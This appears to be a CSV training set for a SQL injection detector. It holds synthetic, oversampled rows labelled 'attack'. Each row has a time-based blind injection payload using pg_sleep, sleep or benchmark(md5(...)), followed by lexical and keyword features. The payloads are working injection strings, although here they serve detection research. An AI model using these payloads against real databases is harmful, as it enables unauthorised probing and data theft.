id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000011,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   # awpq,nearest_attack_euclidean,R000029,0.39796346871172544,67.44731636583919,25.668389819503517,3.608257441768294,22.557853092671355,10.0,27.889463273167838,7.0,0.3341843449783732,0.14834893472026334,0.41362246599717917,0.10384425430418431,0.0,0.11053672683216137,0.0,0.0,0.0,1.0,0.0,4.0,0.0,1.0,0.0,1.0,0.0,0.11053672683216134,0.0,0.8894632731678386,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000012,attack,time," select sleep  (  5  )   and    (    (     (  ""uvzc"" like ""uvzc",nearest_attack_euclidean,R000067,0.29586499721070236,62.91670870321161,18.750126109634834,3.149167003529441,25.666834812846446,1.0,28.166582593576777,8.083291296788389,0.4078792030020031,0.015894339809725655,0.44772833069775003,0.12849812649052114,0.0,3.0,0.0,0.0,0.0,0.08329129678838842,0.0,5.0,0.0,0.0,0.0,0.08329129678838854,0.0,1.0,0.0,0.0,0.0,0.08329129678838831,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000013,attack,time,1   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000014,0.552486477944523,93.65087601442697,22.837280996393257,2.8977698403950045,29.67456199278651,2.0,49.65087601442697,12.325438007213487,0.3170610780286372,0.02136107393538922,0.5300563734214374,0.13152147461453614,0.0,0.16271900360674357,0.0,0.0,1.0,0.0,0.0,10.162719003606744,0.0,0.0,0.0,1.0,0.0,0.16271900360674363,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.16271900360674357,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.162719003606743
SMOTE_000014,attack,time,"1  )   where 2044  =  2044 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000023,0.32384277716807175,76.01288263544615,22.07593210496568,3.3020503186211396,15.227796314897041,17.392543160274553,33.54440737020592,9.848135790068639,0.2013691308269846,0.2278802629673518,0.44125027554802887,0.12950033065763467,0.07593210496568092,0.0,2.0,0.0,0.0,1.924067895034319,0.0,4.9240678950343195,0.0,0.0,0.9240678950343191,3.924067895034319,0.07593210496568092,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000015,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  #,nearest_attack_euclidean,R000033,0.4149895839484452,73.26156559957735,17.883095919704143,2.899586703948274,25.630782799788673,1.1261565599577334,36.378469679873206,10.126156559957735,0.34957270013471387,0.015213703712293289,0.49692301073273815,0.13829058542025466,0.12615655995773456,0.0,0.0,0.0,1.0,0.0,0.0,8.0,0.0,0.0,0.0,1.0,0.12615655995773456,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000016,attack,time,"1'  )   where 8252  =  8252 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000075,0.07381074360095681,93.02940116353267,26.029401163532675,3.709969185123238,21.970598836467325,27.044101745299017,34.0,10.014700581766338,0.2361764421271921,0.29069695878861646,0.36547825245499593,0.10764834662919555,1.0,0.0,0.029401163532676855,0.0,0.0,2.0,0.0,5.0,0.0,0.0,1.0,2.0294011635326767,1.0,0.0,0.014700581766338428,0.9852994182336616,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.014700581766338261,0.9852994182336616,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000017,attack,time,"1""   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000005,1.1794200477676686,79.14870531795718,24.0,3.4227796356193076,17.0,19.0,33.181286732435325,9.967418585521857,0.2172096902413024,0.2427637714461615,0.4146641124869602,0.1253624258255759,0.0,1.0,0.0,0.0,0.0,1.0,0.0,5.967418585521856,0.0,0.0,1.0,1.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000018,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000010,1.6483724633381502,65.2892264117546,24.37353584705276,3.537906421640745,20.83138112940368,10.0,27.45784528235092,7.0,0.31836641207495203,0.1533864929697605,0.4208765498764551,0.10737054507883234,0.0,0.5421547176490802,0.0,0.0,0.0,1.0,0.0,4.0,0.0,1.0,0.0,1.0,0.0,0.5421547176490802,0.0,0.4578452823509197,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000019,attack,time,"1 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   -- kvkk",nearest_attack_euclidean,R000058,1.9182963737197911,80.22316667187964,27.0,3.8475066644282014,19.44451190513426,25.11158333593982,27.2225595256713,8.444511905134261,0.2436507546397761,0.31163198711274487,0.33920304639168997,0.10551421185578903,0.0,0.0,2.0,0.0,0.0,1.4445119051342605,0.0,4.0,0.0,0.0,1.0,3.4445119051342603,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.44451190513426037,0.0,0.5554880948657396,0.4445119051342604,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.4445119051342603
SMOTE_000020,attack,time,"1'  )   where 8252  =  8252 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000075,1.3427021060573543,91.45512703387983,26.617949186448065,3.7576872172347846,23.235898372896127,25.146152440655804,32.76410162710387,10.308974593224033,0.254756323794475,0.274352852769579,0.35796519210273037,0.11292563133321562,1.9269237796720962,0.0,0.0,0.0,0.0,2.0,0.0,4.691025406775967,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.6910254067759678,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.6910254067759679,0.0,0.3089745932240321,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000021,attack,time,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000037,0.8717402591792309,63.66069770033865,23.66069770033865,3.4629510392408864,19.660697700338652,10.0,27.0,7.0,0.30879729633306063,0.15709152356066802,0.4241471136138037,0.10996406649246762,0.0,1.0,0.0,0.0,0.0,1.0,0.0,4.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.6606977003386498,0.3393022996613501,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000022,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   # awpq,nearest_attack_euclidean,R000029,1.6854623543746428,66.43501862646472,25.217509313232362,3.562308593982795,21.826263969848544,10.0,27.60875465661618,7.0,0.3281664801335047,0.15065482852374834,0.41572031137612314,0.10545837996662383,0.0,0.3912453433838189,0.0,0.0,0.0,1.0,0.0,4.0,0.0,1.0,0.0,1.0,0.0,0.3912453433838189,0.0,0.6087546566161811,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.3912453433838189,0.6087546566161812,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000023,attack,time,"1"" where 1132  =  1132 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000026,0.7287914421278956,90.1432573284632,27.395635179112553,3.674421343012432,26.373811074675327,18.0,35.37381107467533,10.395635179112555,0.29175699465357574,0.2006508245003196,0.3920824069037355,0.11550977394236915,0.0,1.0,2.0,0.0,0.0,2.0,0.0,4.3956351791125545,0.0,1.0,0.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000024,attack,time," select sleep  (  5  )   and    (    (     (  ""zlal""  =  ""zlal",nearest_attack_euclidean,R000077,1.2364699987560486,62.43236726888518,17.729469075540713,2.985430457233377,21.56763273111482,2.945652709983306,29.351449096672233,8.567632731114822,0.34568577354174523,0.046420892326128976,0.47046845411469834,0.1374248800174275,0.0,2.5676327311148213,0.0,0.0,0.0,1.0,0.0,4.783816365557411,0.0,0.21618363444258948,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.21618363444258948,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7838163655574105,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000025,attack,time,"1%""  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000066,0.2925498459663333,75.68668221257472,27.72532711497011,3.7208950208289244,16.06866822125747,20.862663557485057,28.686682212574723,10.068668221257472,0.21241775704990037,0.2761222651525192,0.3783959316064333,0.13306404619114717,0.0,1.0,0.0,0.0,0.0,1.0,0.0,5.137336442514945,0.9313317787425276,0.0,1.0,1.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.9313317787425275,0.06866822125747246,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000026,attack,time,"1""   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000005,2.0350256101989155,80.22332379276546,25.91067048289382,3.5159070678574627,16.522332379276545,19.95533524144691,33.22332379276545,10.522332379276545,0.20636890160964608,0.2505035832879128,0.4118425440407806,0.13128497106166062,0.0,1.0,0.0,0.0,0.0,1.0,0.0,6.04466475855309,0.47766762072345526,0.0,1.0,1.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.47766762072345514,0.5223323792765449,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000027,attack,time,"1"" where 7279  =  7279 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000060,1.763164129222448,88.0,27.638115163301222,3.879086764509933,21.276230326602445,27.723769673397555,30.0,9.0,0.24177534462048234,0.31504283719769943,0.3409090909090909,0.10227272727272728,0.0,0.6381151633012232,0.7237696733975537,0.0,0.0,2.0,0.0,4.0,0.0,0.0,1.0,2.7237696733975536,0.0,0.6381151633012232,0.36188483669877686,0.6381151633012232,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000028,attack,time,"1"" where 7279  =  7279 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000060,2.237920622140369,86.57955175051328,26.106069000684368,3.6114717754828782,19.63258625085546,23.212138001368736,33.787861998631264,9.946965499657816,0.2263258625085546,0.2673823859433945,0.39116915820376374,0.11512259334428722,0.0,1.0,0.0,0.0,0.0,1.5265172501710924,0.0,5.420448249486723,0.0,0.0,1.0,1.5265172501710922,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.5265172501710922,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.526517250171092
SMOTE_000029,attack,time,select pg_sleep  (  5  )   and    (    (     (  '%'  =  ',nearest_attack_euclidean,R000011,2.8719376039282243,61.86625387958425,18.486625387958426,3.045147391960133,15.026749224083149,5.379628491625826,29.486625387958426,11.973250775916851,0.24578807114411927,0.0816372270602482,0.4790825568488314,0.19349214494680117,3.486625387958425,0.0,0.0,0.0,0.0,1.4866253879584252,0.0,4.5133746120415745,1.4866253879584252,0.5133746120415748,0.48662538795842536,1.4866253879584252,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.5133746120415748,0.0,0.0,0.0,1.4866253879584255,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.4866253879584252,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.4866253879584255
SMOTE_000030,attack,time,"1""  )   as kfvy where 7305  =  7305 or sleep  (  5  )  --",nearest_attack_euclidean,R000071,0.40305774661079996,58.70101723657258,23.513995075264976,3.5769226604503843,18.0,10.0,23.45801477420507,7.243002462367512,0.3073962965300695,0.17077572029448304,0.3984880654948169,0.1233399176806305,0.0,1.0,2.0,0.0,0.0,1.0,0.0,3.2430024623675116,0.0,0.0,0.0,3.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
